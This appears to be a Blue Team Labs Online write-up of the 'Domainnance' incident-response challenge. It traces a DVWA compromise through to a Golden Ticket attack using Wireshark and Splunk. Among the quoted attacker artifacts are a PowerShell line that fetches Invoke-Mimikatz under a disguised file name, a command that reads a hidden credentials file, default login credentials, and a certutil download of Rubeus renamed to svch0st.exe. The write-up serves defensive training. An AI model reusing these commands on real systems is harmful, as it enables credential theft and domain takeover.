<h1 align="center">Domainnance – Incident Response Investigation</h1>
<h3 align="center">Blue Team Labs Online | Network & Host-Based Analysis</h3>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/93e25750-2a69-49b9-b4c9-fb20bcc2c8d7" />

---

### 🧪 Scenario

A recently formed company working with a mid-scale workforce claimed to have a secure environment. Taking this as a challenge, a 13-year-old kid attempted to gain access to their environment and succeeded. You are onboarded based on your Incident Response skills to investigate the incident.

<p>
Source:
<a href="https://blueteamlabs.online/home/investigation/domainnance-befa8a1fd4" target="_blank">
Blue Team Labs Online – Domainnance
</a>
</p>

---

### 📂 Provided Files

- **Troubleshooting-Splunk.pdf** – used to help spin up the Splunk service  
- **Packet capture file** of the incident  

After starting the Splunk process, it was observed running on the loopback address (`127.0.0.1`) on port `8000`.
<img width="2856" height="1508" alt="image" src="https://github.com/user-attachments/assets/d4d864cc-9295-4e8e-9482-86288f748ad8" />

---

### ❓ Q1) The attacker tried logging into the vulnerable webserver. Can you find the correct credentials?

Before investigating logs, I performed a data summary in Splunk to understand what sources were ingested. The environment contained Windows Event Logs and Sysmon logs.

I then analyzed the packet capture in Wireshark and filtered traffic going to port 80:

tcp.port == 80

vbnet
Copy code

Multiple requests were sent to `192.168.1.12`. Following the TCP stream revealed the DVWA login page hosted on the webserver. The attacker logged in using default credentials:

admin : password

yaml
Copy code

This was a clear misconfiguration.

📸 *Screenshot added here*

---

### ❓ Q2) What is the IP of the attacker machine while interacting with the webserver?

The attacker’s IP address while interacting with the webserver was:

192.168.1.13

yaml
Copy code

📸 *Screenshot added here*

---

### ❓ Q3) The attacker was able to execute commands on the webserver. How many commands were executed?

**Answer:** 6  

This was determined by reviewing POST requests sent to:

POST /dvwa/vulnerabilities/exec/

yaml
Copy code

📸 *Screenshot added here*

---

### ❓ Q4) The attacker found a useful file on the webserver. What is the name of the file?

The attacker gained a foothold and began listing hidden files in `/var/www/dvwa/`.

cat /var/www/dvwa/.credentials.txt

yaml
Copy code

📸 *Screenshot added here*

---

### ❓ Q5) What important data is present inside the file?

Following the TCP stream showed the sensitive data returned in the webserver response.

📸 *Screenshot added here*

---

### ❓ Q6) What internal network subnet did the attacker discover and scan?

Using the filter:

ip.dst == 192.168.1.12 && ip.src == 192.168.1.13

yaml
Copy code

The scan targeted:

10.0.2.0/24

yaml
Copy code

📸 *Screenshot added here*

---

### ❓ Q7) Using Splunk, what is the domain name of the AD environment?

Starting with a broad search:

index=*

yaml
Copy code

Reviewing the **account domain** field revealed the Active Directory domain name.

📸 *Screenshot added here*

---

### ❓ Q8) A user account “mtyson” downloaded files onto one of the systems. What system was it?

PowerShell activity was observed on the second system. The first system only showed system login events.

📸 *Screenshot added here*

---

### ❓ Q9) What is the first file downloaded onto the system?  
**(Format: ActualName, GivenName)**

Sysmon Event ID 1 showed PowerShell executing:

Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Troubleshoot.ps1

makefile
Copy code

**Answer:**
Invoke-Mimikatz.ps1, Troubleshoot.ps1

yaml
Copy code

📸 *Screenshot added here*

---

### ❓ Q10) What one-liner command was used to dump credentials?

Reviewing commands executed from `Troubleshoot.ps1` revealed the credential-dumping command.

📸 *Screenshot added here*

---

### ❓ Q11) The attacker downloaded a compiled binary under a legitimate-looking name. What was it saved as?

`certutil.exe` was used to download **rubeus.exe**, which was renamed to:

svch0st.exe

yaml
Copy code

📸 *Screenshot added here*

---

### ❓ Q12) What ticket was used for the pass-the-ticket attack?

0-60a10000-mtyson@krbtgt~HIGHLYSECURED.TECH-HIGHLYSECURED.TECH.kirbi

yaml
Copy code

📸 *Screenshot added here*

---

### ❓ Q13) What technique was used to achieve domain-wide compromise?

The attacker performed a **Golden Ticket** attack.

📸 *Screenshot added here*

---

### ❓ Q14) What command was used to perform the attack?

The command was identified from the logs.

📸 *Screenshot added here*

---

### 🏁 Conclusion

This investigation demonstrated a full attack chain, from web exploitation to domain-wide compromise, highlighting the importance of proper configuration, monitoring, and incident response.

Thanks for reading.
